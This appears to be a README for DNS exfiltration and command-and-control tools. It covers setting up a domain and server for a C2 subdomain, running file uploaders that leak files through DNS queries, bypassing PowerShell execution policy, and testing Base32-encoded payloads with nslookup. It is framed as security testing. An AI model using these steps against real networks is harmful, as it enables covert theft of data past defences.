
# DNS Exfiltration Tools

**Disclaimer:**  
These tools are intended solely for **security testing purposes**. I am not responsible for any misuse of these tools. **Use responsibly**.

---

## Table of Contents
1. [Infrastructure Setup](#infrastructure-setup)
2. [Tool Usage](#tool-usage)
    - [dns_file_receiver.py (Unix - Server)](#dns-file-receiver-unix---server)
    - [dns_file_uploader.ps1 (Windows - Client)](#dns-file-uploader-windows---client)
    - [dns_file_uploader.py (Unix - Client)](#dns-file-uploader-unix---client)
    - [ns_dns_server.py (Unix - Server)](#ns-dns-server-unix---server)
3. [Base32 Payload Instructions for ns_dns_server.py (Client)](#base32-payload-instructions-for-ns_dns_serverpy-client)

---

## Infrastructure Setup

**Prerequisites:**
- You must own a domain and have an internet-connected server.
- Example setup uses AWS and Cloudflare.

**Server Information:**
- AWS VM IP: `123.123.123.123`
- Cloudflare Domain: `fakedomain.com`

**Cloudflare DNS Configuration:**
1. Create an NS record:  
   **Name:** `c2.fakedomain.com`  
2. Create an A record for C2:  
   **Name:** `c2`  
   **IPv4 address:** `123.123.123.123`  
3. Create an A record for `example.com`:  
   **IPv4 address:** `123.123.123.123`

---

## Tool Usage

### dns_file_receiver.py (Unix - Server)

1. Edit the `domain` parameter in the script to:  
   ```bash
   c2.fakedomain.com
   ```
2. Adjust the `SOCKET_TIMEOUT` to an appropriate duration in seconds. This determines how long the script will stay active, waiting for client connections.

3. Run the script:  
   ```bash
   sudo python3 dns_file_receiver.py
   ```

### dns_file_uploader.ps1 (Windows - Client)

1. Update the `domain` parameter in the script to:  
   ```bash
   c2.fakedomain.com
   ```
2. Run the script with PowerShell:  
   ```bash
   powershell -ExecutionPolicy Bypass -File .\dns_file_uploader.ps1
   ```
3. Follow the prompts:
    - **File path:** (quotes can be used)
    - **Domain OR IP:** Either the AWS server IP (`123.123.123.123`) or domain name (`fakedomain.com`)
    - **Random delay:** Set a random delay in seconds

### dns_file_uploader.py (Unix - Client)

1. Update the `DNS_SERVER` parameter to:  
   - AWS server IP (`123.123.123.123`) or domain name (`fakedomain.com`)

2. Update the `domain` parameter in the script to:  
   ```bash
   c2.fakedomain.com
   ```

3. Run the script:  
   ```bash
   sudo python3 dns_file_uploader.py
   ```
4. Follow the prompts:
    - **File path:** (quotes can be used)
    - **Random delay:** Set a random delay in seconds

### ns_dns_server.py (Unix - Server)
**IMPORTANT NOTE:**
- Requires base32 payload: Instructions for that below.
[Base32 Payload Instructions for ns_dns_server.py (Client)](#base32-payload-instructions-for-ns_dns_serverpy-client)

1. Update the `DOMAIN` parameter in the script to:  
   ```bash
   c2.fakedomain.com
   ```
2. Optionally, update the `fake_ip` parameter if needed.

3. Run the script:  
   ```bash
   sudo python3 ns-dns_server.py
   ```

---

## Base32 Payload Instructions for ns_dns_server.py (Client)
**IMPORTANT NOTE:**
- **Maximum Length of a DNS Label:** Each label (subdomain) in a DNS name can be up to 63 characters.
- **Maximum Length of the Entire Domain Name:** The full domain name (including all labels and dots) can be a maximum of 253 characters.

1. Use [CyberChef](https://gchq.github.io/CyberChef/#recipe=To_Base32('A-Z2-7%3D')) to create a Base32 payload.
   
2. Use `dns_length_calc.py` to ensure that the lengths are valid. Follow the prompts.
   ```bash
   python3 dns_length_calc.py
   ```
   - Example:
   ```bash
   Enter subdomain: KRCVGVCJJZDSAVCFKNKESTSHEAYTEMY
   Enter full domain (e.g., example.com): c2.fakedomain.com
   Subdomain length: 31 characters (Valid)
   Full domain length: 49 characters (Valid)
   ```
   
3. Once the payload is generated, use `nslookup` to test the server:  
   ```bash
   nslookup <payload>.c2.fakedomain.com
   ```

**Example:**

- **Input:**  
   ```
   TESTING TESTING 123
   ```
- **Output:**  
   ```
   KRCVGVCJJZDSAVCFKNKESTSHEAYTEMY=
   ```

- **Command:**  
   ```bash
   nslookup KRCVGVCJJZDSAVCFKNKESTSHEAYTEMY.c2.fakedomain.com
   ```
  **EXTRA NOTE:**
  - The '=' is added by the script when it tries to decrypt it.
---

**Note:** All other tools not documented here are works in progress.
